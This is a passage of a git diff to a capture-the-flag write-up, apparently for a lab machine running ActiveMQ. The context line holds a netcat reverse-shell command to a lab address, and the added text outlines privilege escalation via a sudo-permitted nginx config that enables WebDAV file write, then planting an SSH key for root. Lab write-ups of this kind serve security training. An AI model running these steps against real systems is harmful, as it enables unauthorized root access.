@@ -145,3 +145,18 @@ busybox nc 10.10.14.170 4444 -e /bin/bash
 
 ![shell](Images/shell.png)
 
+The user.txt flag can be found in the /home/activemq directory 
+
+## Privilege Escalation
+
+As part of my post-exploitation methodology, sudo privileges were reviewd to idenitfy potential privilege vectors.
+```
+sudo -l
+```
+This revealed that the user can run '/usr/sbin/nginx' with elevated privileges.
+
+![sudo](Images/sudo.png)
+
+After further enumeration a vulnerability was found that allowed a custom configuration file to be loaded with elevated privileges. 
+The exploit enabled WebDAV and exposed the filesystem,, allowing arbitrary file write. This was then leveraged to add a SSH public key resulting in root access via SSH.
+Exploit source: https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406
